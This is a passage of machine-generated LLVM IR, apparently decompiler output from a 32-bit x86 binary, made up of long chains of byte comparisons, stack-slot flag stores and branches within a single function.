  %v4_804e083 = inttoptr i32 %v3_804e083 to i8*
  store i8 %v1_804e083, i8* %v4_804e083, align 1
  %v0_804e088 = load i32, i32* @esp, align 4
  %v1_804e088 = add i32 %v0_804e088, 71
  %v2_804e088 = inttoptr i32 %v1_804e088 to i8*
  %v3_804e088 = load i8, i8* %v2_804e088, align 1
  %v4_804e088 = icmp eq i8 %v3_804e088, 0
  br i1 %v4_804e088, label %dec_label_pc_804e098, label %dec_label_pc_804e08f

dec_label_pc_804e08f:                             ; preds = %dec_label_pc_804e080
  %v0_804e08f = load i32, i32* @ebx, align 4
  %v1_804e08f = trunc i32 %v0_804e08f to i8
  %v11_804e08f = icmp eq i8 %v1_804e08f, -98
  br i1 %v11_804e08f, label %dec_label_pc_804de41, label %dec_label_pc_804e098

dec_label_pc_804e098:                             ; preds = %dec_label_pc_804e08f, %dec_label_pc_804e080
  %v0_804e098 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e098 = trunc i32 %v0_804e098 to i8
  %v11_804e098 = icmp eq i8 %v1_804e098, -100
  br i1 %v11_804e098, label %dec_label_pc_804ff3e, label %dec_label_pc_804e0a1

dec_label_pc_804e0a1:                             ; preds = %dec_label_pc_804ff3e, %dec_label_pc_804e098
  %v11_804e0a1 = icmp eq i8 %v1_804e098, -89
  %v1_804e0a4 = zext i1 %v11_804e0a1 to i8
  %v3_804e0a4 = add i32 %v0_804e088, 70
  %v4_804e0a4 = inttoptr i32 %v3_804e0a4 to i8*
  store i8 %v1_804e0a4, i8* %v4_804e0a4, align 1
  %v0_804e0a9 = load i32, i32* @esp, align 4
  %v1_804e0a9 = add i32 %v0_804e0a9, 70
  %v2_804e0a9 = inttoptr i32 %v1_804e0a9 to i8*
  %v3_804e0a9 = load i8, i8* %v2_804e0a9, align 1
  %v4_804e0a9 = icmp ne i8 %v3_804e0a9, 0
  %v0_804e0bf.pre = load i32, i32* @ebx, align 4
  %v1_804e0b0 = trunc i32 %v0_804e0bf.pre to i8
  %v10_804e0b0 = icmp eq i8 %v1_804e0b0, 44
  %or.cond200 = and i1 %v4_804e0a9, %v10_804e0b0
  br i1 %or.cond200, label %dec_label_pc_804de41, label %dec_label_pc_804e0b9

dec_label_pc_804e0b9:                             ; preds = %dec_label_pc_804e0a1
  %v0_804e0b9 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e0b9 = trunc i32 %v0_804e0b9 to i8
  %v11_804e0b9 = icmp eq i8 %v1_804e0b9, -88
  %v1_804e0bc = zext i1 %v11_804e0b9 to i32
  %v2_804e0bc = load i32, i32* %eax.global-to-local, align 4
  %v3_804e0bc = and i32 %v2_804e0bc, -256
  %v4_804e0bc = or i32 %v1_804e0bc, %v3_804e0bc
  store i32 %v4_804e0bc, i32* %eax.global-to-local, align 4
  %v10_804e0bf = icmp eq i8 %v1_804e0b0, 68
  %v1_804e0c2 = zext i1 %v10_804e0bf to i8
  %v3_804e0c2 = add i32 %v0_804e0a9, 69
  %v4_804e0c2 = inttoptr i32 %v3_804e0c2 to i8*
  store i8 %v1_804e0c2, i8* %v4_804e0c2, align 1
  %v0_804e0c7 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e0c7 = trunc i32 %v0_804e0c7 to i8
  %v4_804e0c7 = icmp eq i8 %v3_804e0c7, 0
  %v2_804e0d9.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e0c7, label %dec_label_pc_804e0d6, label %dec_label_pc_804e0cb

dec_label_pc_804e0cb:                             ; preds = %dec_label_pc_804e0b9
  %v1_804e0cb = add i32 %v2_804e0d9.pre, 69
  %v2_804e0cb = inttoptr i32 %v1_804e0cb to i8*
  %v3_804e0cb = load i8, i8* %v2_804e0cb, align 1
  %v4_804e0cb = icmp eq i8 %v3_804e0cb, 0
  %v1_804e0d0 = icmp eq i1 %v4_804e0cb, false
  br i1 %v1_804e0d0, label %dec_label_pc_804de41, label %dec_label_pc_804e0d6

dec_label_pc_804e0d6:                             ; preds = %dec_label_pc_804e0b9, %dec_label_pc_804e0cb
  %v0_804e0d6 = load i32, i32* @ebx, align 4
  %v1_804e0d6 = trunc i32 %v0_804e0d6 to i8
  %v10_804e0d6 = icmp eq i8 %v1_804e0d6, 85
  %v1_804e0d9 = zext i1 %v10_804e0d6 to i8
  %v3_804e0d9 = add i32 %v2_804e0d9.pre, 68
  %v4_804e0d9 = inttoptr i32 %v3_804e0d9 to i8*
  store i8 %v1_804e0d9, i8* %v4_804e0d9, align 1
  %v0_804e0de = load i32, i32* %eax.global-to-local, align 4
  %v3_804e0de = trunc i32 %v0_804e0de to i8
  %v4_804e0de = icmp eq i8 %v3_804e0de, 0
  br i1 %v4_804e0de, label %dec_label_pc_804e0d6.dec_label_pc_804e0f6_crit_edge, label %dec_label_pc_804e0e2

dec_label_pc_804e0d6.dec_label_pc_804e0f6_crit_edge: ; preds = %dec_label_pc_804e0d6
  %v0_804e0f6.pre = load i32, i32* @ebx, align 4
  %v2_804e0f9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e0f6

dec_label_pc_804e0e2:                             ; preds = %dec_label_pc_804e0d6
  %v0_804e0e2 = load i32, i32* @esp, align 4
  %v1_804e0e2 = add i32 %v0_804e0e2, 68
  %v2_804e0e2 = inttoptr i32 %v1_804e0e2 to i8*
  %v3_804e0e2 = load i8, i8* %v2_804e0e2, align 1
  %v4_804e0e2 = icmp eq i8 %v3_804e0e2, 0
  %v1_804e0e7 = icmp eq i1 %v4_804e0e2, false
  br i1 %v1_804e0e7, label %dec_label_pc_804de41, label %dec_label_pc_804e0ed

dec_label_pc_804e0ed:                             ; preds = %dec_label_pc_804e0e2
  %v0_804e0ed = load i32, i32* @ebx, align 4
  %v1_804e0ed = trunc i32 %v0_804e0ed to i8
  %v10_804e0ed = icmp eq i8 %v1_804e0ed, 102
  br i1 %v10_804e0ed, label %dec_label_pc_804de41, label %dec_label_pc_804e0f6

dec_label_pc_804e0f6:                             ; preds = %dec_label_pc_804e0d6.dec_label_pc_804e0f6_crit_edge, %dec_label_pc_804e0ed
  %v2_804e0f9 = phi i32 [ %v2_804e0f9.pre, %dec_label_pc_804e0d6.dec_label_pc_804e0f6_crit_edge ], [ %v0_804e0e2, %dec_label_pc_804e0ed ]
  %v0_804e0f6 = phi i32 [ %v0_804e0f6.pre, %dec_label_pc_804e0d6.dec_label_pc_804e0f6_crit_edge ], [ %v0_804e0ed, %dec_label_pc_804e0ed ]
  %v1_804e0f6 = trunc i32 %v0_804e0f6 to i8
  %v10_804e0f6 = icmp eq i8 %v1_804e0f6, 59
  %v1_804e0f9 = zext i1 %v10_804e0f6 to i8
  %v3_804e0f9 = add i32 %v2_804e0f9, 67
  %v4_804e0f9 = inttoptr i32 %v3_804e0f9 to i8*
  store i8 %v1_804e0f9, i8* %v4_804e0f9, align 1
  %v0_804e0fe = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e0fe = trunc i32 %v0_804e0fe to i8
  %v11_804e0fe = icmp eq i8 %v1_804e0fe, -53
  %v0_804ff2e = load i32, i32* @esp, align 4
  br i1 %v11_804e0fe, label %dec_label_pc_804ff2e, label %dec_label_pc_804e107

dec_label_pc_804e107:                             ; preds = %dec_label_pc_804e0f6, %dec_label_pc_804ff2e
  %v0_804e107 = load i32, i32* @ebx, align 4
  %v1_804e107 = trunc i32 %v0_804e107 to i8
  %v10_804e107 = icmp eq i8 %v1_804e107, 34
  %v1_804e10a = zext i1 %v10_804e107 to i8
  %v3_804e10a = add i32 %v0_804ff2e, 66
  %v4_804e10a = inttoptr i32 %v3_804e10a to i8*
  store i8 %v1_804e10a, i8* %v4_804e10a, align 1
  %v0_804e10f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e10f = trunc i32 %v0_804e10f to i8
  %v11_804e10f = icmp eq i8 %v1_804e10f, -52
  %v0_804ff1e = load i32, i32* @esp, align 4
  br i1 %v11_804e10f, label %dec_label_pc_804ff1e, label %dec_label_pc_804e118

dec_label_pc_804e118:                             ; preds = %dec_label_pc_804e107, %dec_label_pc_804ff1e
  %v11_804e118 = icmp eq i8 %v1_804e10f, -49
  %v1_804e11b = zext i1 %v11_804e118 to i8
  %v3_804e11b = add i32 %v0_804ff1e, 65
  %v4_804e11b = inttoptr i32 %v3_804e11b to i8*
  store i8 %v1_804e11b, i8* %v4_804e11b, align 1
  %v0_804e120 = load i32, i32* @esp, align 4
  %v1_804e120 = add i32 %v0_804e120, 65
  %v2_804e120 = inttoptr i32 %v1_804e120 to i8*
  %v3_804e120 = load i8, i8* %v2_804e120, align 1
  %v4_804e120 = icmp ne i8 %v3_804e120, 0
  %v0_804e136.pre = load i32, i32* @ebx, align 4
  %v1_804e127 = trunc i32 %v0_804e136.pre to i8
  %v10_804e127 = icmp eq i8 %v1_804e127, 30
  %or.cond201 = and i1 %v4_804e120, %v10_804e127
  br i1 %or.cond201, label %dec_label_pc_804de41, label %dec_label_pc_804e130

dec_label_pc_804e130:                             ; preds = %dec_label_pc_804e118
  %v0_804e130 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e130 = trunc i32 %v0_804e130 to i8
  %v10_804e130 = icmp eq i8 %v1_804e130, 117
  %v1_804e133 = zext i1 %v10_804e130 to i32
  %v2_804e133 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e133 = and i32 %v2_804e133, -256
  %v4_804e133 = or i32 %v1_804e133, %v3_804e133
  store i32 %v4_804e133, i32* %eax.global-to-local, align 4
  %v10_804e136 = icmp eq i8 %v1_804e127, 55
  %v1_804e139 = zext i1 %v10_804e136 to i8
  %v3_804e139 = add i32 %v0_804e120, 64
  %v4_804e139 = inttoptr i32 %v3_804e139 to i8*
  store i8 %v1_804e139, i8* %v4_804e139, align 1
  %v0_804e13e = load i32, i32* %eax.global-to-local, align 4
  %v3_804e13e = trunc i32 %v0_804e13e to i8
  %v4_804e13e = icmp eq i8 %v3_804e13e, 0
  %v2_804e150.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e13e, label %dec_label_pc_804e14d, label %dec_label_pc_804e142

dec_label_pc_804e142:                             ; preds = %dec_label_pc_804e130
  %v1_804e142 = add i32 %v2_804e150.pre, 64
  %v2_804e142 = inttoptr i32 %v1_804e142 to i8*
  %v3_804e142 = load i8, i8* %v2_804e142, align 1
  %v4_804e142 = icmp eq i8 %v3_804e142, 0
  %v1_804e147 = icmp eq i1 %v4_804e142, false
  br i1 %v1_804e147, label %dec_label_pc_804de41, label %dec_label_pc_804e14d

dec_label_pc_804e14d:                             ; preds = %dec_label_pc_804e130, %dec_label_pc_804e142
  %v0_804e14d = load i32, i32* @ebx, align 4
  %v1_804e14d = trunc i32 %v0_804e14d to i8
  %v10_804e14d = icmp eq i8 %v1_804e14d, 56
  %v1_804e150 = zext i1 %v10_804e14d to i8
  %v3_804e150 = add i32 %v2_804e150.pre, 63
  %v4_804e150 = inttoptr i32 %v3_804e150 to i8*
  store i8 %v1_804e150, i8* %v4_804e150, align 1
  %v0_804e155 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e155 = trunc i32 %v0_804e155 to i8
  %v4_804e155 = icmp eq i8 %v3_804e155, 0
  %v2_804e167.pre = load i32, i32* @esp, align 4
  br i1 %v4_804e155, label %dec_label_pc_804e164, label %dec_label_pc_804e159

dec_label_pc_804e159:                             ; preds = %dec_label_pc_804e14d
  %v1_804e159 = add i32 %v2_804e167.pre, 63
  %v2_804e159 = inttoptr i32 %v1_804e159 to i8*
  %v3_804e159 = load i8, i8* %v2_804e159, align 1
  %v4_804e159 = icmp eq i8 %v3_804e159, 0
  %v1_804e15e = icmp eq i1 %v4_804e159, false
  br i1 %v1_804e15e, label %dec_label_pc_804de41, label %dec_label_pc_804e164

dec_label_pc_804e164:                             ; preds = %dec_label_pc_804e14d, %dec_label_pc_804e159
  %v0_804e164 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e164 = trunc i32 %v0_804e164 to i8
  %v7_804e164 = icmp eq i8 %v1_804e164, 80
  %v1_804e167 = zext i1 %v7_804e164 to i8
  %v3_804e167 = add i32 %v2_804e167.pre, 62
  %v4_804e167 = inttoptr i32 %v3_804e167 to i8*
  store i8 %v1_804e167, i8* %v4_804e167, align 1
  %v0_804e16c = load i32, i32* @esp, align 4
  %v1_804e16c = add i32 %v0_804e16c, 62
  %v2_804e16c = inttoptr i32 %v1_804e16c to i8*
  %v3_804e16c = load i8, i8* %v2_804e16c, align 1
  %v4_804e16c = icmp eq i8 %v3_804e16c, 0
  br i1 %v4_804e16c, label %dec_label_pc_804e17c, label %dec_label_pc_804e173

dec_label_pc_804e173:                             ; preds = %dec_label_pc_804e164
  %v0_804e173 = load i32, i32* @ebx, align 4
  %v1_804e173 = trunc i32 %v0_804e173 to i8
  %v11_804e173 = icmp eq i8 %v1_804e173, -21
  br i1 %v11_804e173, label %dec_label_pc_804de41, label %dec_label_pc_804e17c

dec_label_pc_804e17c:                             ; preds = %dec_label_pc_804e173, %dec_label_pc_804e164
  %v1_804e17c = add i32 %v0_804e16c, 65
  %v2_804e17c = inttoptr i32 %v1_804e17c to i8*
  %v3_804e17c = load i8, i8* %v2_804e17c, align 1
  %v4_804e17c = icmp eq i8 %v3_804e17c, 0
  br i1 %v4_804e17c, label %dec_label_pc_804e18c, label %dec_label_pc_804e183

dec_label_pc_804e183:                             ; preds = %dec_label_pc_804e17c
  %v0_804e183 = load i32, i32* @ebx, align 4
  %v1_804e183 = trunc i32 %v0_804e183 to i8
  %v10_804e183 = icmp eq i8 %v1_804e183, 120
  br i1 %v10_804e183, label %dec_label_pc_804de41, label %dec_label_pc_804e18c

dec_label_pc_804e18c:                             ; preds = %dec_label_pc_804e183, %dec_label_pc_804e17c
  %v0_804e18c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e18c = trunc i32 %v0_804e18c to i8
  %v11_804e18c = icmp eq i8 %v1_804e18c, -47
  %v1_804e18f = zext i1 %v11_804e18c to i8
  %v3_804e18f = add i32 %v0_804e16c, 61
  %v4_804e18f = inttoptr i32 %v3_804e18f to i8*
  store i8 %v1_804e18f, i8* %v4_804e18f, align 1
  %v0_804e194 = load i32, i32* @esp, align 4
  %v1_804e194 = add i32 %v0_804e194, 61
  %v2_804e194 = inttoptr i32 %v1_804e194 to i8*
  %v3_804e194 = load i8, i8* %v2_804e194, align 1
  %v4_804e194 = icmp eq i8 %v3_804e194, 0
  br i1 %v4_804e194, label %dec_label_pc_804e1a4, label %dec_label_pc_804e19b

dec_label_pc_804e19b:                             ; preds = %dec_label_pc_804e18c
  %v0_804e19b = load i32, i32* @ebx, align 4
  %v1_804e19b = trunc i32 %v0_804e19b to i8
  %v10_804e19b = icmp eq i8 %v1_804e19b, 35
  br i1 %v10_804e19b, label %dec_label_pc_804de41, label %dec_label_pc_804e1a4

dec_label_pc_804e1a4:                             ; preds = %dec_label_pc_804e19b, %dec_label_pc_804e18c
  %v0_804e1a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e1a4 = trunc i32 %v0_804e1a4 to i8
  %v7_804e1a4 = icmp eq i8 %v1_804e1a4, 64
  %v1_804e1a7 = zext i1 %v7_804e1a4 to i8
  %v3_804e1a7 = add i32 %v0_804e194, 60
  %v4_804e1a7 = inttoptr i32 %v3_804e1a7 to i8*
  store i8 %v1_804e1a7, i8* %v4_804e1a7, align 1
  %v0_804e1ac = load i32, i32* @esp, align 4
  %v1_804e1ac = add i32 %v0_804e1ac, 60
  %v2_804e1ac = inttoptr i32 %v1_804e1ac to i8*
  %v3_804e1ac = load i8, i8* %v2_804e1ac, align 1
  %v4_804e1ac = icmp eq i8 %v3_804e1ac, 0
  br i1 %v4_804e1ac, label %dec_label_pc_804e1bc, label %dec_label_pc_804e1b3

dec_label_pc_804e1b3:                             ; preds = %dec_label_pc_804e1a4
  %v0_804e1b3 = load i32, i32* @ebx, align 4
  %v1_804e1b3 = trunc i32 %v0_804e1b3 to i8
  %v10_804e1b3 = icmp eq i8 %v1_804e1b3, 70
  br i1 %v10_804e1b3, label %dec_label_pc_804de41, label %dec_label_pc_804e1bc

dec_label_pc_804e1bc:                             ; preds = %dec_label_pc_804e1b3, %dec_label_pc_804e1a4
  %v0_804e1bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e1bc = trunc i32 %v0_804e1bc to i8
  %v11_804e1bc = icmp eq i8 %v1_804e1bc, -84
  %v1_804e1bf = zext i1 %v11_804e1bc to i8
  %v3_804e1bf = add i32 %v0_804e1ac, 59
  %v4_804e1bf = inttoptr i32 %v3_804e1bf to i8*
  store i8 %v1_804e1bf, i8* %v4_804e1bf, align 1
  %v0_804e1c4 = load i32, i32* @ebx, align 4
  %v1_804e1c4 = trunc i32 %v0_804e1c4 to i8
  %tmp706 = icmp ugt i8 %v1_804e1c4, 15
  %v4_804e1c7 = zext i1 %tmp706 to i8
  %v5_804e1c7 = load i32, i32* @esp, align 4
  %v6_804e1c7 = add i32 %v5_804e1c7, 58
  %v7_804e1c7 = inttoptr i32 %v6_804e1c7 to i8*
  store i8 %v4_804e1c7, i8* %v7_804e1c7, align 1
  %v0_804e1cc = load i32, i32* @esp, align 4
  %v1_804e1cc = add i32 %v0_804e1cc, 59
  %v2_804e1cc = inttoptr i32 %v1_804e1cc to i8*
  %v3_804e1cc = load i8, i8* %v2_804e1cc, align 1
  %v4_804e1cc = icmp eq i8 %v3_804e1cc, 0
  br i1 %v4_804e1cc, label %dec_label_pc_804e1e3, label %dec_label_pc_804e1d3

dec_label_pc_804e1d3:                             ; preds = %dec_label_pc_804e1bc
  %v1_804e1d3 = add i32 %v0_804e1cc, 58
  %v2_804e1d3 = inttoptr i32 %v1_804e1d3 to i8*
  %v3_804e1d3 = load i8, i8* %v2_804e1d3, align 1
  %v4_804e1d3 = icmp eq i8 %v3_804e1d3, 0
  br i1 %v4_804e1d3, label %dec_label_pc_804e1e3, label %dec_label_pc_804e1da

dec_label_pc_804e1da:                             ; preds = %dec_label_pc_804e1d3
  %v0_804e1da = load i32, i32* @ebx, align 4
  %v1_804e1da = trunc i32 %v0_804e1da to i8
  %tmp707 = icmp ult i8 %v1_804e1da, 32
  br i1 %tmp707, label %dec_label_pc_804de41, label %dec_label_pc_804e1e3

dec_label_pc_804e1e3:                             ; preds = %dec_label_pc_804e1da, %dec_label_pc_804e1d3, %dec_label_pc_804e1bc
  %v0_804e1e3 = load i32, i32* @ebx, align 4
  %v1_804e1e3 = trunc i32 %v0_804e1e3 to i8
  %tmp = icmp ugt i8 %v1_804e1e3, 63
  %v4_804e1e6 = zext i1 %tmp to i8
  %v6_804e1e6 = add i32 %v0_804e1cc, 57
  %v7_804e1e6 = inttoptr i32 %v6_804e1e6 to i8*
  store i8 %v4_804e1e6, i8* %v7_804e1e6, align 1
  %v0_804e1eb = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e1eb = trunc i32 %v0_804e1eb to i8
  %v10_804e1eb = icmp eq i8 %v1_804e1eb, 100
  %v0_804fef7 = load i32, i32* @esp, align 4
  br i1 %v10_804e1eb, label %dec_label_pc_804fef7, label %dec_label_pc_804e1f4

dec_label_pc_804e1f4:                             ; preds = %dec_label_pc_804e1e3, %dec_label_pc_804ff02, %dec_label_pc_804fef7
  %v11_804e1f4 = icmp eq i8 %v1_804e1eb, -87
  %v1_804e1f7 = zext i1 %v11_804e1f4 to i8
  %v3_804e1f7 = add i32 %v0_804fef7, 56
  %v4_804e1f7 = inttoptr i32 %v3_804e1f7 to i8*
  store i8 %v1_804e1f7, i8* %v4_804e1f7, align 1
  %v0_804e1fc = load i32, i32* @ebx, align 4
  %v1_804e1fc = trunc i32 %v0_804e1fc to i8
  %v11_804e1fc = icmp eq i8 %v1_804e1fc, -2
  %v1_804e1ff = zext i1 %v11_804e1fc to i8
  %v2_804e1ff = load i32, i32* @esp, align 4
  %v3_804e1ff = add i32 %v2_804e1ff, 55
  %v4_804e1ff = inttoptr i32 %v3_804e1ff to i8*
  store i8 %v1_804e1ff, i8* %v4_804e1ff, align 1
  %v0_804e204 = load i32, i32* @esp, align 4
  %v1_804e204 = add i32 %v0_804e204, 56
  %v2_804e204 = inttoptr i32 %v1_804e204 to i8*
  %v3_804e204 = load i8, i8* %v2_804e204, align 1
  %v4_804e204 = icmp eq i8 %v3_804e204, 0
  br i1 %v4_804e204, label %dec_label_pc_804e216, label %dec_label_pc_804e20b

dec_label_pc_804e20b:                             ; preds = %dec_label_pc_804e1f4
  %v1_804e20b = add i32 %v0_804e204, 55
  %v2_804e20b = inttoptr i32 %v1_804e20b to i8*
  %v3_804e20b = load i8, i8* %v2_804e20b, align 1
  %v4_804e20b = icmp eq i8 %v3_804e20b, 0
  %v1_804e210 = icmp eq i1 %v4_804e20b, false
  br i1 %v1_804e210, label %dec_label_pc_804de41, label %dec_label_pc_804e216

dec_label_pc_804e216:                             ; preds = %dec_label_pc_804e20b, %dec_label_pc_804e1f4
  %v0_804e216 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e216 = trunc i32 %v0_804e216 to i8
  %v11_804e216 = icmp eq i8 %v1_804e216, -58
  %v1_804e219 = zext i1 %v11_804e216 to i8
  %v3_804e219 = add i32 %v0_804e204, 54
  %v4_804e219 = inttoptr i32 %v3_804e219 to i8*
  store i8 %v1_804e219, i8* %v4_804e219, align 1
  %v0_804e21e = load i32, i32* @esp, align 4
  %v1_804e21e = add i32 %v0_804e21e, 54
  %v2_804e21e = inttoptr i32 %v1_804e21e to i8*
  %v3_804e21e = load i8, i8* %v2_804e21e, align 1
  %v4_804e21e = icmp eq i8 %v3_804e21e, 0
  %v0_804e248.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_804e21e, label %dec_label_pc_804e233, label %dec_label_pc_804e225

dec_label_pc_804e225:                             ; preds = %dec_label_pc_804e216
  %v1_804e225 = trunc i32 %v0_804e248.pre.pre to i8
  %tmp708 = icmp ugt i8 %v1_804e225, 17
  %tmp709 = or i8 %v1_804e225, 1
  %tmp710 = icmp eq i8 %tmp709, 19
  %or.cond203 = and i1 %tmp708, %tmp710
  br i1 %or.cond203, label %dec_label_pc_804de41, label %dec_label_pc_804e233

dec_label_pc_804e233:                             ; preds = %dec_label_pc_804e216, %dec_label_pc_804e225
  %v1_804e233 = add i32 %v0_804e21e, 60
  %v2_804e233 = inttoptr i32 %v1_804e233 to i8*
  %v3_804e233 = load i8, i8* %v2_804e233, align 1
  %v4_804e233 = icmp ne i8 %v3_804e233, 0
  %.pre679 = trunc i32 %v0_804e248.pre.pre to i8
  %v1_804e23a.off = add i8 %.pre679, -69
  %tmp711 = icmp ult i8 %v1_804e23a.off, -98
  %or.cond701 = and i1 %v4_804e233, %tmp711
  br i1 %or.cond701, label %dec_label_pc_804de41, label %dec_label_pc_804e248

dec_label_pc_804e248:                             ; preds = %dec_label_pc_804e233
  %tmp165 = icmp ugt i8 %.pre679, 34
  %v4_804e24b = zext i1 %tmp165 to i8
  %v6_804e24b = add i32 %v0_804e21e, 53
  %v7_804e24b = inttoptr i32 %v6_804e24b to i8*
  store i8 %v4_804e24b, i8* %v7_804e24b, align 1
  %v0_804e250 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e250 = trunc i32 %v0_804e250 to i8
  switch i8 %v1_804e250, label %dec_label_pc_804e26b [
    i8 -128, label %dec_label_pc_804fede
    i8 -127, label %dec_label_pc_804fec7
    i8 -126, label %dec_label_pc_804feb0
  ]

dec_label_pc_804e26b:                             ; preds = %dec_label_pc_804fee9, %dec_label_pc_804fec7, %dec_label_pc_804feb0, %dec_label_pc_804e248, %dec_label_pc_804fede
  %v0_804e26b = load i32, i32* @ebx, align 4
  %v1_804e26b = trunc i32 %v0_804e26b to i8
  %tmp166 = icmp ult i8 %v1_804e26b, 3
  %v3_804e26e = zext i1 %tmp166 to i32
  %v4_804e26e = load i32, i32* %eax.global-to-local, align 4
  %v5_804e26e = and i32 %v4_804e26e, -256
  %v6_804e26e = or i32 %v3_804e26e, %v5_804e26e
  %v7_804e26e = xor i32 %v6_804e26e, 1
  store i32 %v7_804e26e, i32* %eax.global-to-local, align 4
  %v11_804e271 = icmp eq i8 %v1_804e250, -125
  %v3_804fe9a = trunc i32 %v7_804e26e to i8
  %v4_804fe9a.not487 = icmp ne i8 %v3_804fe9a, 0
  br i1 %v11_804e271, label %dec_label_pc_804fe9a, label %dec_label_pc_804e27a

dec_label_pc_804e27a:                             ; preds = %dec_label_pc_804e26b
  %v11_804e27e = icmp eq i8 %v1_804e250, -124
  %or.cond205 = and i1 %v11_804e27e, %v4_804fe9a.not487
  %tmp712 = icmp ult i8 %v1_804e26b, -5
  %or.cond308 = and i1 %tmp712, %or.cond205
  br i1 %or.cond308, label %dec_label_pc_804de41, label %dec_label_pc_804e287

dec_label_pc_804e287.thread:                      ; preds = %dec_label_pc_804fe9a
  %tmp167452 = icmp ult i8 %v1_804e26b, 5
  %v3_804e28a453 = zext i1 %tmp167452 to i32
  %v6_804e28a454 = or i32 %v3_804e28a453, %v5_804e26e
  %v7_804e28a455 = xor i32 %v6_804e28a454, 1
  store i32 %v7_804e28a455, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e29f

dec_label_pc_804e287:                             ; preds = %dec_label_pc_804e27a
  %tmp167 = icmp ult i8 %v1_804e26b, 5
  %v3_804e28a = zext i1 %tmp167 to i32
  %v6_804e28a = or i32 %v3_804e28a, %v5_804e26e
  %v7_804e28a = xor i32 %v6_804e28a, 1
  store i32 %v7_804e28a, i32* %eax.global-to-local, align 4
  switch i8 %v1_804e250, label %dec_label_pc_804e29f [
    i8 -122, label %dec_label_pc_804fe84
    i8 -120, label %dec_label_pc_804fe6d
  ]

dec_label_pc_804e29f:                             ; preds = %dec_label_pc_804e287.thread, %dec_label_pc_804fe84, %dec_label_pc_804fe6d, %dec_label_pc_804e287
  %v11_804e29f = icmp eq i8 %v1_804e250, -118
  %v1_804e2a2 = zext i1 %v11_804e29f to i8
  %v2_804e2a2 = load i32, i32* @esp, align 4
  %v3_804e2a2 = add i32 %v2_804e2a2, 52
  %v4_804e2a2 = inttoptr i32 %v3_804e2a2 to i8*
  store i8 %v1_804e2a2, i8* %v4_804e2a2, align 1
  %v0_804e2a7 = load i32, i32* @esp, align 4
  %v1_804e2a7 = add i32 %v0_804e2a7, 52
  %v2_804e2a7 = inttoptr i32 %v1_804e2a7 to i8*
  %v3_804e2a7 = load i8, i8* %v2_804e2a7, align 1
  %v4_804e2a7 = icmp eq i8 %v3_804e2a7, 0
  br i1 %v4_804e2a7, label %dec_label_pc_804e2bc, label %dec_label_pc_804e2ae

dec_label_pc_804e2ae:                             ; preds = %dec_label_pc_804e29f
  %v0_804e2ae = load i32, i32* @ebx, align 4
  %v1_804e2ae = trunc i32 %v0_804e2ae to i8
  %v1_804e2ae.off = add i8 %v1_804e2ae, -13
  %tmp713 = icmp ult i8 %v1_804e2ae.off, -75
  br i1 %tmp713, label %dec_label_pc_804de41, label %dec_label_pc_804e2bc

dec_label_pc_804e2bc:                             ; preds = %dec_label_pc_804e2ae, %dec_label_pc_804e29f
  %v0_804e2bc = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e2bc = trunc i32 %v0_804e2bc to i8
  %v11_804e2bc = icmp eq i8 %v1_804e2bc, -117
  %v1_804e2bf = zext i1 %v11_804e2bc to i8
  %v3_804e2bf = add i32 %v0_804e2a7, 51
  %v4_804e2bf = inttoptr i32 %v3_804e2bf to i8*
  store i8 %v1_804e2bf, i8* %v4_804e2bf, align 1
  %v0_804e2c4 = load i32, i32* @esp, align 4
  %v1_804e2c4 = add i32 %v0_804e2c4, 51
  %v2_804e2c4 = inttoptr i32 %v1_804e2c4 to i8*
  %v3_804e2c4 = load i8, i8* %v2_804e2c4, align 1
  %v4_804e2c4 = icmp ne i8 %v3_804e2c4, 0
  %v0_804e2d9.pre = load i32, i32* @ebx, align 4
  %.pre680 = trunc i32 %v0_804e2d9.pre to i8
  %v1_804e2cb.off = add i8 %.pre680, -31
  %tmp714 = icmp ult i8 %v1_804e2cb.off, 112
  %or.cond703 = and i1 %v4_804e2c4, %tmp714
  br i1 %or.cond703, label %dec_label_pc_804de41, label %dec_label_pc_804e2d9

dec_label_pc_804e2d9:                             ; preds = %dec_label_pc_804e2bc
  %v4_804e2d9 = icmp eq i8 %.pre680, 0
  %v1_804e2db = icmp eq i1 %v4_804e2d9, false
  %v2_804e2db = zext i1 %v1_804e2db to i8
  %v4_804e2db = add i32 %v0_804e2c4, 50
  %v5_804e2db = inttoptr i32 %v4_804e2db to i8*
  store i8 %v2_804e2db, i8* %v5_804e2db, align 1
  %v0_804e2e0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e2e0 = trunc i32 %v0_804e2e0 to i8
  %v11_804e2e0 = icmp eq i8 %v1_804e2e0, -116
  %v0_804ffd3 = load i32, i32* @esp, align 4
  br i1 %v11_804e2e0, label %dec_label_pc_804ffd3, label %dec_label_pc_804e2e9

dec_label_pc_804e2e9:                             ; preds = %dec_label_pc_804e2d9, %dec_label_pc_804ffde, %dec_label_pc_804ffd3
  %v0_804e2e9 = load i32, i32* @ebx, align 4
  %v1_804e2e9 = trunc i32 %v0_804e2e9 to i8
  %tmp168 = icmp ugt i8 %v1_804e2e9, 44
  %v4_804e2ec = zext i1 %tmp168 to i8
  %v6_804e2ec = add i32 %v0_804ffd3, 49
  %v7_804e2ec = inttoptr i32 %v6_804e2ec to i8*
  store i8 %v4_804e2ec, i8* %v7_804e2ec, align 1
  %v0_804e2f1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e2f1 = trunc i32 %v0_804e2f1 to i8
  switch i8 %v1_804e2f1, label %dec_label_pc_804e303 [
    i8 -113, label %dec_label_pc_804ffba
    i8 -112, label %dec_label_pc_804ffa3
  ]

